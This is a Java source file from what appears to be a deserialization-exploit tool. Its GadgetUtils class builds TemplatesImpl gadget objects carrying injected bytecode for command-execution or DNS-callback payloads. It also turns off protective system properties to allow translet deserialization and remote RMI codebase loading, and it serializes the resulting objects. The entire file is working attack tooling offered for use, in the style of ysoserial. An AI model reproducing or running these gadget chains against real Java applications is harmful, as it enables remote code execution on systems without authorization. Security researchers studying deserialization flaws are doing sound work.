package net.roboterh.injector.utils;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.xml.internal.messaging.saaj.util.ByteOutputStream;
import net.roboterh.injector.enums.PayloadEnum;
import net.roboterh.injector.templates.CommandTemplate;
import net.roboterh.injector.templates.DnsLogTemplate;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;

/*
 * utility generator functions for common jdk-only gadgets
 */
@SuppressWarnings ( {
        "restriction", "rawtypes", "unchecked"
} )
public class GadgetUtils {
    private static final Logger logger = LogManager.getLogger(GadgetUtils.class);

    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    // the class of AnnotationInvocationHandler
    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    /**
     * create TemplatesImpl class
     * @param type
     * @param param
     * @return
     * @throws Exception
     */
    public static Object createTemplatesImpl (PayloadEnum type, String... param) throws Exception {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            // Xalan loaded
            return createTemplatesImpl(
                    type,
                    Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                    Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                    Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"),
                    param);
        }

        // create class using internal xalan's class
        return createTemplatesImpl(type, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class, param);
    }
    public static <T> T createTemplatesImpl (PayloadEnum type, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory, String... param)
            throws Exception {
        final T templates = tplClass.newInstance();
        byte[] classBytes = null;
        switch (type.name()){
            // obtain payload class
            case "DnsLog":
                DnsLogTemplate dnsLogTemplate = new DnsLogTemplate(param[0]);
                classBytes = dnsLogTemplate.getBytes();
                break;
            case "Command":
                CommandTemplate commandTemplate = new CommandTemplate(param[0]);
                classBytes =  commandTemplate.getBytes();
                break;
            default:
                logger.info("Wrong payload syntax ...");
        }

        // set the attributes of TemplatesImpl
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
        Reflections.setFieldValue(templates, "_name", "x");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());

        return templates;
    }


    /**
     * create Dynamic proxy
     */
    public static <T> T createProxy (final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[ 0 ] = iface;
        if ( ifaces.length > 0 ) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(GadgetUtils.class.getClassLoader(), allIfaces, ih));
    }

    /**
     * serialization of class
     */
    public static byte[] serialize(Object obj) {
        try {
            ByteArrayOutputStream byteOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteOutputStream);
            objectOutputStream.writeObject(obj);
            return byteOutputStream.toByteArray();
        } catch (Exception e) {
            logger.info(e.getMessage());
        }
        return null;
    }

    /**
     * control of bytes
     * @param bs
     * @param index
     * @return
     */
    public static byte[] deleteAt(byte[] bs, int index) {
        int length = bs.length - 1;
        byte[] ret = new byte[length];

        if(index == bs.length - 1) {
            System.arraycopy(bs, 0, ret, 0, length);
        } else if(index < bs.length - 1) {
            for(int i = index; i < length; i++) {
                bs[i] = bs[i + 1];
            }

            System.arraycopy(bs, 0, ret, 0, length);
        }

        return ret;
    }
    public static byte[] addAtIndex(byte[] bs, int index, byte b) {
        int length = bs.length + 1;
        byte[] ret = new byte[length];

        System.arraycopy(bs, 0, ret, 0, index);
        ret[index] = b;
        System.arraycopy(bs, index, ret, index + 1, length - index - 1);

        return ret;
    }
    public static byte[] addAtLast(byte[] bs, byte b) {
        int length = bs.length + 1;
        byte[] ret = new byte[length];

        System.arraycopy(bs, 0, ret, 0, length-1);
        ret[length - 1] = b;

        return ret;
    }
}
